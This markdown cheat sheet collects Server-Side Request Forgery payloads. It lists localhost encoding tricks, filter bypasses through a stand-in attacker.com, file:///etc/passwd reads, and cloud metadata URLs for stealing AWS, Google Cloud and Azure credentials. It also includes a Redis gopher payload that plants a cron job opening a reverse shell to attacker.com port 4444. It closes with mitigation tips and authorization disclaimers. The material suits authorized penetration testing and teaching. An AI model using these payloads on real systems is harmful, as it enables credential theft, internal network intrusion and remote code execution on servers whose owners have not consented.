```markdown
# SSRF (Server-Side Request Forgery) Payloads Cheat Sheet

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to induce the server to make requests to unintended locations. Below is a collection of SSRF payloads for testing and educational purposes.

## Basic SSRF Payloads

### Standard URL Schemes
```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::]
http://[::1]
http://2130706433 (127.0.0.1 in decimal)
http://017700000001 (127.0.0.1 in octal)
http://0x7f000001 (127.0.0.1 in hex)
```

### Alternative Localhost Representations
```
http://127.1
http://127.0.1
http://localhost.
http://localhost@attacker.com
http://127.0.0.1.nip.io
http://localtest.me
http://127.0.0.1.xip.io
```

## Protocol Schemes

### File Protocol
```
file:///etc/passwd
file:///c:/windows/win.ini
```

### DNS Protocol
```
dns://google.com
```

### FTP Protocol
```
ftp://attacker.com
ftp://anonymous:anonymous@attacker.com
```

### Gopher Protocol
```
gopher://127.0.0.1:22/_SSH%20connection%20attempt
gopher://127.0.0.1:25/_SMTP%20commands
gopher://127.0.0.1:6379/_Redis%20commands
```

### Dict Protocol
```
dict://127.0.0.1:6379/info
dict://localhost:11211/stats
```

## Cloud Metadata Endpoints

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
```

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/user-data
```

## Bypass Techniques

### URL Encoding
```
http://%6c%6f%63%61%6c%68%6f%73%74
http://127.0.0.1%23.attacker.com
```

### Domain Redirection
```
http://attacker.com/redirect.php?url=http://localhost
http://xip.io/127.0.0.1
http://spoofed.burpcollaborator.net
```

### Using @ in URLs
```
http://localhost@attacker.com
http://127.0.0.1:80@attacker.com
```

### Using Fragments
```
http://attacker.com#@localhost/
http://attacker.com?@localhost/
```

### DNS Rebinding
```
http://7f000001.0a00020.rbndr.us (DNS rebinding service)
http://localtest.me (resolves to 127.0.0.1)
```

## Internal Network Scanning

### Common Ports
```
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8000
http://127.0.0.1:8080
http://127.0.0.1:9000
```

### Database Ports
```
http://127.0.0.1:3306 (MySQL)
http://127.0.0.1:5432 (PostgreSQL)
http://127.0.0.1:27017 (MongoDB)
http://127.0.0.1:6379 (Redis)
```

## SSRF to RCE

### Redis
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### Memcached
```
gopher://127.0.0.1:11211/_%0d%0aset%20test%200%200%205%0d%0aTEST%0d%0a
```

## Blind SSRF Detection

### Out-of-Band Techniques
```
http://attacker.com/ssrf_callback
http://burpcollaborator.net
http://x.burpcollaborator.net
http://canarytokens.com/tags/ssrf
```

### Time-Based Detection
```
http://localhost:22 (SSH - long timeout)
http://localhost:25 (SMTP - banner response)
```

## Prevention and Mitigation

1. Implement allow-list of permitted domains and protocols
2. Validate and sanitize all user-supplied URLs
3. Disable unused URL schemes (file://, gopher://, dict://, etc.)
4. Use network-level protections (firewalls, egress filtering)
5. Implement proper authentication for internal services
6. Use cloud metadata service v2+ with required headers
7. Disable following redirects from user-supplied URLs
8. Use DNS pinning to prevent DNS rebinding attacks
9. Implement rate limiting on outbound requests
10. Use web application firewalls (WAFs) with SSRF rules

## Important Notes

- These payloads are for educational and authorized testing purposes only
- Unauthorized SSRF attacks are illegal and punishable by law
- Always get proper written authorization before testing
- Many modern systems have protections against SSRF
- Responsible disclosure is recommended when vulnerabilities are found
- Consider using legal bug bounty programs for testing production systems
- Document all testing activities for compliance purposes
- Be extremely cautious when testing cloud metadata endpoints
- Never test systems you don't own or have explicit permission to test

Remember to use these techniques only in environments where you have explicit permission to test. Unauthorized access to computer systems is prohibited by law in most jurisdictions.
```
